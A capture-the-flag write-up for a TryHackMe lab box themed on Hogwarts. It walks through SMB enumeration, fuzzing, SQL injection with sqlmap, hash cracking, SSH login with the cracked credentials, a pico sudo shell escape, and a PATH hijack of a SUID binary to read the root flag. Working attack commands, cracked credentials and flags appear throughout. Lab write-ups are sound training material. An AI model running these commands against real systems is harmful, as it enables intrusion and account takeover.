# RECONNAISSANCE

We can begin by checking the smb protocol, maybe anonymous login is enabled:

There we go, we got an interesting share: `sambashare`, let's check the files inside of it:


![](images/Pasted%20image%2020250404171351.png)

We got two files, let's read them:


![](images/Pasted%20image%2020250404171408.png)

`spellnames.txt` is a wordlist, it seems like we need to bruteforce some sort of login page, let's check the web application:

![](images/Pasted%20image%2020250404171441.png)

Simple apache2 page, if we check source code, we can see the following:


![](images/Pasted%20image%2020250404171510.png)

We got a subdomain, let's add it to `/etc/hosts`:

```
echo '10.10.196.103 hogwartz-castle.thm' | sudo tee -a /etc/hosts
```

If we go inside the subdomain, we can check this:

![](images/Pasted%20image%2020250404171657.png)

We got the login page, based on that, we can craft the following hydra command to bruteforce:

```
hydra -l Hagrid -P /usr/share/wordlists/rockyou.txt hogwartz-castle.thm http-post-form "/login:user=^USER^&password=^PASS^:F=Incorrect Username or Password" -t 40
```

Unfortunately for us, nothing came from the scan, either with the other wordlist or other username, seems like bruteforcing may not be the way, what about fuzzing, we forgot fuzzing in the main page:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://castle.thm/FUZZ" -ic -c -t 200

There we go, we got something interesting, an `email` directory, let's take a look:


We get the following contents:

Madeye,

It is done. I registered the name you requested below but changed the "s" to a "z". You should be good to go.

Madeye,

I don't think we can do "hogwarts" due to copyright issues, but letâ€™s go with "hogwartz", how does that sound?

Dear Mr. Echo,

Thanks so much for helping me develop my castle for TryHackMe. I think it would be great to register the domain name of "hogwarts-castle.thm" for the box. I have been reading about virtual hosting in Apache and it's a great way to host multiple domains on the same server. The docs says that...

You can read more here: https://httpd.apache.org/docs/2.4/vhosts/index.html

What do you think?

Thanks,

Nothing important, we are missing something, for example, we only tested for brute force in the login page but nothing else, what about `SQLI`:

![](images/Pasted%20image%2020250404173656.png)

![](images/Pasted%20image%2020250404173707.png)

There we go, `SQLI` is possible in this website, let's proceed to exploitation.




# EXPLOITATION
---


Since we already know we got `SQLI`, we can use `sqlmap` to speed up the process:


```
sqlmap -u 'http://hogwartz-castle.thm/login' --random-agent --method POST --data 'user=Harry&password=pass' -p user --skip passwrd --level 5 --risk 3 --dbms SQLite --dump -T users -C name,password,admin,notes --flush-session --threads 10 --no-cast --tamper unionalltounion --union-char 1337
```

From this, we can get a series of hashes, once we save all those hashes, we can proceed to crack them. There's a hint on how to crack them, it says:

```
My linux username is my first name, and password uses best64
```

So, by doing this, we can crack it using hashcat:

```
hashcat --force -m 1700 hashes2.txt spellnames.txt -r /usr/share/doc/hashcat/rules/best64.rule
```

We get the following:

```
b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
```

There we go, we got the credentials, since the username is the first name of him, we got some username on the sqlmap scan:

```
harry:wingardiumleviosa123
```


We can now go into ssh using those credentials:

![](images/Pasted%20image%2020250404182627.png)

```
harry@hogwartz-castle:~$ cat user1.txt
RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}
```


Let's start privilege escalation.



# PRIVILEGE ESCALATION
---


Let's check our sudo privileges:


```
harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry:
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
```

Weird, we can run `/usr/bin/pico` as user`hermonine`, let's check this on `gtfobins`:

![](images/Pasted%20image%2020250404182759.png)

Let's do this:

```
sudo -u hermonine TERM=xterm /usr/bin/pico 
ctrl R ctrl X
reset; sh 1>&0 2>&0
```

![](images/Pasted%20image%2020250404183940.png)

Let's get a more comfortable shell:

```
/usr/bin/script -qc /bin/bash /dev/null
```

![](images/Pasted%20image%2020250404183955.png)

```
hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt
RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
```


If we check `find / -perm -4000 2>/dev/null`, we can see this:

![](images/Pasted%20image%2020250404184310.png)

Interesting, there's something called `/srv/time-turner/swagger`, let's take a look:

![](images/Pasted%20image%2020250404184352.png)

It seems like some sort of RNG is happening behind this, we can analyze it with `ghidra` or test this other stuff:

```bash
echo '111' | /srv/time-turner/swagger | grep "of" | cut -f5 -d' ' | /srv/time-turner/swagger ;
```

##### **How the Hijack Works**:

- **Predictable RNG**:  
    The binary uses the input (e.g., `111`) to generate its output. If the RNG is poorly implemented (e.g., uses input as a seed without proper entropy), the output becomes predictable.  
    
    Example:
    - Input `111` → Output `456`.
    - Input `456` → Output `789`.
        
- **Controlled Feedback**:  
    By extracting the output number and piping it back into the binary, the attacker forces the RNG into a deterministic sequence. This bypasses randomness.


![](images/Pasted%20image%2020250404184846.png)


We can use the following to get `root.txt`, we can change the method and get our `authorized` to gain a shell as root, to the simplicity of things, let's simply read the flag:


```
TD=$(mktemp -d)
echo 'cat /root/root.txt' > "$TD/uname"
chmod a+x "$TD/uname"
export PATH=$TD:$PATH
echo 667 | /srv/time-turner/swagger | sed -n 2p | cut -d ' ' -f 5 | /srv/time-turner/swagger
```

We get this output:

```
Guess my number: Nice use of the time-turner!
This system architecture is RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
```

Root flag is:

```
RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}
```
